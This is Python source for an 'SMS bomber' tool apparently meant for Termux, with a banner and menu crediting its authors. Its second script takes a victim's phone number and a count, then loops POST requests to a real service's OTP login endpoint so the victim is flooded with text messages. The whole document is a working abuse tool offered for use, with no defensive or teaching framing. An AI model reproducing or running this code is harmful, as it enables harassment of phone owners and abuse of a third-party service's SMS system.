import os
import time
import sys

def clr():
    os.system("clear")


def sms():
    os.system("python sms.py")

def exit():
    sys.exit("Thanks For Useing My Tool")


def fb():
    os.system('xdg-open https://www.facebook.com/groups/termux.latest.command/?ref=share')


clr()

acl='\033[1;30m'
rcl='\033[1;31m'			   #red
ycl='\033[1;33m'
ncl='\033[0;00m'
green="\033[0;32m"        # Green




print(rcl+">Wait<")
time.sleep(2)

while True:
	clr()
	print(rcl+"""  


██████╗  ██████╗ ███╗   ███╗ █████╗ ███╗   ██╗
██╔══██╗██╔═══██╗████╗ ████║██╔══██╗████╗  ██║
██████╔╝██║   ██║██╔████╔██║███████║██╔██╗ ██║
██╔══██╗██║   ██║██║╚██╔╝██║██╔══██║██║╚██╗██║
██║  ██║╚██████╔╝██║ ╚═╝ ██║██║  ██║██║ ╚████║
╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
                                              
     
                                    
====================================================
 Created By :- HRIDOY-AHAMMED-NIROB
 Edit By   :- PICCI-ROMAN-KING
====================================================""")
	print(rcl+"\n\tSelect Your OptionS ")
	print(green+"\n\n [1] START SMS BOMBING\n [2] MY FACEBOOK GROUP\n [0] EXIT [!]")
	print("----------------------------------------------------")
	opt=int(input(rcl+"\n\n [#] Type Your Options :- "))
	if opt==1:
	   sms()
	elif opt==2:
	     fb()
	elif opt==0:
	   exit()
	
	#Clur


red="\033[0;31m"          # Red

yellow="\033[0;33m"       # Yellow

green="\033[0;32m"        # Green

color_off="\033[0m"       # Text Reset

bblack="\033[1;30m"       # Black

bred="\033[1;31m"         # Red

ured="\033[4;31m"         # Red

on_green="\033[42m"       # Green

blue="\033[0;34m"         # Blue

lightblue = '\033[94m'

red = '\033[91m'

white = '\33[97m'

yellow = '\33[93m'

green = '\033[1;32m'

cyan  = "\033[96m"

#imports

import os
import time
import sys
import requests
from requests.structures import CaseInsensitiveDict
print("\033[H\033[J")
#print(


def clr():
    os.system("clear")

clr()
number=str(input(red+"\n\t Enter Your Number: "))
amount=int(input(red+"\n\t Enter Your Amount: "))
url = "https://ss.binge.buzz/otp/send/login"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/x-www-form-urlencoded"

data = "phone="+number

for j in range(amount):
    resp = requests.post(url, headers=headers, data=data)
    print(str(j+1)+green+" SMS SEND BOMBING DONE BY ROMAN:)")
time.sleep(5)
print(blue+"\n\t DONE√")
